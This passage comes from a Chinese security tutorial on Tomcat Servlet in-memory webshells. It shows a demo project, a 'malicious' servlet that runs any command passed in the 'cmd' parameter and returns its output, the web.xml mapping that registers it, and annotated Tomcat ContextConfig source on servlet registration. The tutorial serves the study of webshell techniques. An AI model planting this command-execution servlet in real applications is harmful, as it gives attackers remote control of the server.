title="2. Servlet 内存马"></a>2. Servlet 内存马</h2><p>Servlet（Server Applet）是 Java Servlet 的简称，称为小服务程序或服务连接器，用来读取客户端发送的数据，处理并返回结果。</p><h3 id="2-1-环境创建："><a href="#2-1-环境创建：" class="headerlink" title="2.1 环境创建："></a>2.1 环境创建：</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516153.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516728.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515773.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515748.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515757.png" alt="img"></p><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.105<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>替换注释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;servlet&gt;<br>    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;com.src.tomcatdemo.HelloServlet&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br><br>&lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;HelloWorld&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/hello-servlet&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;<br></code></pre></td></tr></table></figure><h4 id="先写一个恶意类测试：-1"><a href="#先写一个恶意类测试：-1" class="headerlink" title="先写一个恶意类测试："></a>先写一个恶意类测试：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.tomcatdemo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-comment">// 基础恶意类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br><br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>                String line;<br>                <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                    res.getWriter().println(line);<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>web.xml 配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span>    <br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.src.tomcatdemo.ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ServletTest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/servlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081516566.png" alt="img"></p><h3 id="2-2-流程分析："><a href="#2-2-流程分析：" class="headerlink" title="2.2 流程分析："></a>2.2 流程分析：</h3><h4 id="前置流程："><a href="#前置流程：" class="headerlink" title="前置流程："></a>前置流程：</h4><p>因为 Web 应用程序的顺序是 Listener —&gt; Filter —&gt; Servlet，所以我们在调用 Servlet 的时候也会看到 Listener 和 Filter 的流程</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515838.png" alt="img"></p><p>首先根据上图流程跟到 configureStart() 完成启动配置，解析 web.xml</p><p>**xml 赋值对象：**从 <code>web.xml</code> 配置文件中读取配置信息（如 Servlet、Filter 参数），并将其转化为内存中的 Java 对象（如 <code>ServletDef</code>、<code>FilterDef</code>）。</p><p><strong>configureContext() :</strong></p><p>用于配置 <code>Context</code> 对象（代表一个 Web 应用）在这个方法中，会进行一系列初始化操作，比如注册 Filter、Servlet 等。</p><p><strong>context.addFilterDef(filter):</strong></p><p>将解析得到的 FilterDef（Filter 定义对象）添加到 Context 中。</p><p>FilterDef 包含 Filter 的名称、类名、初始化参数等。</p><p><strong>context.addFilterMap(filterMap):</strong><br>将 Filter 的映射关系（即哪些 URL 或 Servlet 会被该 Filter 拦截）添加到 Context 中。</p><p><strong>每个servlet包装成wrapper对象:</strong><br>这是 Servlet 容器中的关键设计：每个 Servlet 都被封装为一个 Wrapper 对象。</p><p>Wrapper 是 Tomcat 容器体系中的最底层容器，专门用于管理一个 Servlet 的生命周期。</p><h4 id="创建与装载-StandardWrapper"><a href="#创建与装载-StandardWrapper" class="headerlink" title="创建与装载 StandardWrapper"></a>创建与装载 StandardWrapper</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ContextConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">LifecycleListener</span> &#123;<br>    ...<br>    <span class="hljs-comment">//将解析好的 web.xml 配置到 web 应用</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureContext</span><span class="hljs-params">(WebXml webxml)</span> &#123;<br>        <span class="hljs-comment">// As far as possible, process in alphabetical order so it is easy to</span><br>        <span class="hljs-comment">// check everything is present</span><br>        <span class="hljs-comment">// Some validation depends on correct public ID</span><br>        context.setPublicId(webxml.getPublicId());<br><br>        <span class="hljs-comment">// Everything else in order</span><br>        context.setEffectiveMajorVersion(webxml.getMajorVersion());<br>        context.setEffectiveMinorVersion(webxml.getMinorVersion());<br><br>        <span class="hljs-comment">//参数和基础属性配置</span><br>        <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : webxml.getContextParams().entrySet()) &#123;<br>            context.addParameter(entry.getKey(), entry.getValue());<br>        &#125;<br>        context.setDenyUncoveredHttpMethods(webxml.getDenyUncoveredHttpMethods());<br>        context.setDisplayName(webxml.getDisplayName());<br>        context.setDistributable(webxml.isDistributable());<br><br>        <span class="hljs-comment">//JNDI 资源配置</span><br>        <span class="hljs-keyword">for</span> (ContextLocalEjb ejbLocalRef : webxml.getEjbLocalRefs().values()) &#123;<br>            context.getNamingResources().addLocalEjb(ejbLocalRef);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (ContextEjb ejbRef : webxml.getEjbRefs().values()) &#123;<br>            context.getNamingResources().addEjb(ejbRef);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (ContextEnvironment environment : webxml.getEnvEntries().values()) &#123;<br>            context.getNamingResources().addEnvironment(environment);<br>        &#125;<br>        <br>        <span class="hljs-comment">//Web 组件配置</span><br>        <span class="hljs-comment">//错误页面</span><br>        <span class="hljs-keyword">for</span> (ErrorPage errorPage : webxml.getErrorPages().values()) &#123;<br>            context.addErrorPage(errorPage);<br>        &#125;<br>        <span class="hljs-comment">//Filter 配置</span><br>        <span class="hljs-keyword">for</span> (FilterDef filter : webxml.getFilters().values()) &#123;<br>            <span class="hljs-keyword">if</span> (filter.getAsyncSupported() == <span class="hljs-literal">null</span>) &#123;<br>                filter.setAsyncSupported(<span class="hljs-string">&quot;false&quot;</span>);<br>            &#125;<br>            context.addFilterDef(filter);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : webxml.getFilterMappings()) &#123;<br>            context.addFilterMap(filterMap);<br>        &#125;<br>        context.setJspConfigDescriptor(webxml.getJspConfigDescriptor());<br>        <span class="hljs-comment">//listener 配置</span><br>        <span class="hljs-keyword">for</span> (String listener : webxml.getListeners()) &#123;<br>            context.addApplicationListener(listener);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : webxml.getLocaleEncodingMappings().entrySet()) &#123;<br>            context.addLocaleEncodingMappingParameter(entry.getKey(), entry.getValue());<br>        &#125;<br>        <span class="hljs-comment">// Prevents IAE</span><br>        <span class="hljs-keyword">if</span> (webxml.getLoginConfig() != <span class="hljs-literal">null</span>) &#123;<br>            context.setLoginConfig(webxml.getLoginConfig());<br>        &#125;<br>        <span class="hljs-keyword">for</span> (MessageDestinationRef mdr : webxml.getMessageDestinationRefs().values()) &#123;<br>            context.getNamingResources().addMessageDestinationRef(mdr);<br>        &#125;<br><br>        <span class="hljs-comment">// messageDestinations were ignored in Tomcat 6, so ignore here</span><br><br>        context.setIgnoreAnnotations(webxml.isMetadataComplete());<br>        <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : webxml.getMimeMappings().entrySet()) &#123;<br>            context.addMimeMapping(entry.getKey(), entry.getValue());<br>        &#125;<br>        context.setRequestCharacterEncoding(webxml.getRequestCharacterEncoding());<br>        <span class="hljs-comment">// Name is just used for ordering</span><br>        <span class="hljs-keyword">for</span> (ContextResourceEnvRef resource : webxml.getResourceEnvRefs().values()) &#123;<br>            context.getNamingResources().addResourceEnvRef(resource);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (ContextResource resource : webxml.getResourceRefs().values()) &#123;<br>            context.getNamingResources().addResource(resource);<br>        &#125;<br>        context.setResponseCharacterEncoding(webxml.getResponseCharacterEncoding());<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">allAuthenticatedUsersIsAppRole</span> <span class="hljs-operator">=</span><br>                webxml.getSecurityRoles().contains(SecurityConstraint.ROLE_ALL_AUTHENTICATED_USERS);<br>        <span class="hljs-keyword">for</span> (SecurityConstraint constraint : webxml.getSecurityConstraints()) &#123;<br>            <span class="hljs-keyword">if</span> (allAuthenticatedUsersIsAppRole) &#123;<br>                constraint.treatAllAuthenticatedUsersAsApplicationRole();<br>            &#125;<br>            context.addConstraint(constraint);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (String role : webxml.getSecurityRoles()) &#123;<br>            context.addSecurityRole(role);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (ContextService service : webxml.getServiceRefs().values()) &#123;<br>            context.getNamingResources().addService(service);<br>        &#125;<br>        <span class="hljs-comment">/* 核心部分 -- Servlet 配置 */</span><br>        <span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;<br>            <span class="hljs-comment">//创建 Servlet 包装器 wrapper</span><br>            <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br>            <span class="hljs-comment">// Description is ignored</span><br>            <span class="hljs-comment">// Display name is ignored</span><br>            <span class="hljs-comment">// Icons are ignored</span><br><br>            <span class="hljs-comment">// jsp-file gets passed to the JSP Servlet as an init-param</span><br><br>            <span class="hljs-comment">//设置启动加载顺序</span><br>            <span class="hljs-keyword">if</span> (servlet.getLoadOnStartup() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());<br>            &#125;<br>            <span class="hljs-comment">//设置 Servlet 启用状态</span><br>            <span class="hljs-keyword">if</span> (servlet.getEnabled() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setEnabled(servlet.getEnabled().booleanValue());<br>            &#125;<br>            <span class="hljs-comment">//获取 Servlet 名称</span><br>            wrapper.setName(servlet.getServletName());<br>            Map&lt;String,String&gt; params = servlet.getParameterMap();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : params.entrySet()) &#123;<br>                wrapper.addInitParameter(entry.getKey(), entry.getValue());<br>            &#125;<br>            <span class="hljs-comment">//获取运行身份</span><br>            wrapper.setRunAs(servlet.getRunAs());<br>            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();<br>            <span class="hljs-keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;<br>                wrapper.addSecurityReference(roleRef.getName(), roleRef.getLink());<br>            &#125;<br>            <span class="hljs-comment">//获取 Servlet 类名</span><br>            wrapper.setServletClass(servlet.getServletClass());<br>            <span class="hljs-comment">//配置文件上传设置</span><br>            <span class="hljs-type">MultipartDef</span> <span class="hljs-variable">multipartdef</span> <span class="hljs-operator">=</span> servlet.getMultipartDef();<br>            <span class="hljs-keyword">if</span> (multipartdef != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">maxFileSize</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">maxRequestSize</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">fileSizeThreshold</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != multipartdef.getMaxFileSize()) &#123;<br>                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != multipartdef.getMaxRequestSize()) &#123;<br>                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;<br>                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());<br>                &#125;<br><br>                wrapper.setMultipartConfigElement(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MultipartConfigElement</span>(multipartdef.getLocation(), maxFileSize,<br>                        maxRequestSize, fileSizeThreshold));<br>            &#125;<br>            <span class="hljs-keyword">if</span> (servlet.getAsyncSupported() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setAsyncSupported(servlet.getAsyncSupported().booleanValue());<br>            &#125;<br>            wrapper.setOverridable(servlet.isOverridable());<br>            context.addChild(wrapper);<br>        &#125;<br>        <span class="hljs-comment">//Servlet URL 映射 配置路径</span><br>        <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : webxml.getServletMappings().entrySet()) &#123;<br>            context.addServletMappingDecoded(entry.getKey(), entry.getValue());<br>        &#125;<br>        <span class="hljs-comment">//Session 配置</span><br>        <span class="hljs-type">SessionConfig</span> <span class="hljs-variable">sessionConfig</span> <span class="hljs-operator">=</span> webxml.getSessionConfig();<br>        <span class="hljs-keyword">if</span> (sessionConfig != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (sessionConfig.getSessionTimeout() != <span class="hljs-literal">null</span>) &#123;<br>                context.setSessionTimeout(sessionConfig.getSessionTimeout().intValue());<br>            &#125;<br>            <span class="hljs-type">SessionCookieConfig</span> <span class="hljs-variable">scc</span> <span class="hljs-operator">=</span> context.getServletContext().getSessionCookieConfig();<br>            scc.setName(sessionConfig.getCookieName());<br>            scc.setDomain(sessionConfig.getCookieDomain());<br>            scc.setPath(sessionConfig.getCookiePath());<br>            scc.setComment(sessionConfig.getCookieComment());<br>            <span class="hljs-keyword">if</span> (sessionConfig.getCookieHttpOnly() != <span class="hljs-literal">null</span>) &#123;<br>                scc.setHttpOnly(sessionConfig.getCookieHttpOnly().booleanValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (sessionConfig.getCookieSecure() != <span class="hljs-literal">null</span>) &#123;<br>                scc.setSecure(sessionConfig.getCookieSecure().booleanValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (sessionConfig.getCookieMaxAge() != <span class="hljs-literal">null</span>) &#123;<br>                scc.setMaxAge(sessionConfig.getCookieMaxAge().intValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!sessionConfig.getSessionTrackingModes().isEmpty()) &#123;<br>                context.getServletContext().setSessionTrackingModes(sessionConfig.getSessionTrackingModes());<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// Context doesn&#x27;t use version directly</span><br><br>        <span class="hljs-keyword">for</span> (String welcomeFile : webxml.getWelcomeFiles()) &#123;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             * The following will result in a welcome file of &quot;&quot; so don&#x27;t add that to the context &lt;welcome-file-list&gt;</span><br><span class="hljs-comment">             * &lt;welcome-file/&gt; &lt;/welcome-file-list&gt;</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">if</span> (welcomeFile != <span class="hljs-literal">null</span> &amp;&amp; !welcomeFile.isEmpty()) &#123;<br>                context.addWelcomeFile(welcomeFile);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// Do this last as it depends on servlets</span><br>        <span class="hljs-comment">//JSP 属性 处理</span><br>        <span class="hljs-keyword">for</span> (JspPropertyGroup jspPropertyGroup : webxml.getJspPropertyGroups()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">jspServletName</span> <span class="hljs-operator">=</span> context.findServletMapping(<span class="hljs-string">&quot;*.jsp&quot;</span>);<br>            <span class="hljs-keyword">if</span> (jspServletName == <span class="hljs-literal">null</span>) &#123;<br>                jspServletName = <span class="hljs-string">&quot;jsp&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (context.findChild(jspServletName) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">for</span> (String urlPattern : jspPropertyGroup.getUrlPatterns()) &#123;<br>                    context.addServletMappingDecoded(urlPattern, jspServletName, <span class="hljs-literal">true</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                    <span class="hljs-keyword">for</span> (String urlPattern : jspPropertyGroup.getUrlPatterns()) &#123;<br>                        log.debug(sm.getString(<span class="hljs-string">&quot;contextConfig.noJsp&quot;</span>, urlPattern, jspServletName));<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : webxml.getPostConstructMethods().entrySet()) &#123;<br>            context.addPostConstructMethod(entry.getKey(), entry.getValue());<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (Entry&lt;String,String&gt; entry : webxml.getPreDestroyMethods().entrySet()) &#123;<br>            context.addPreDestroyMethod(entry.getKey(), entry.getValue());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="断点调试："><a href="#断点调试：" class="headerlink" 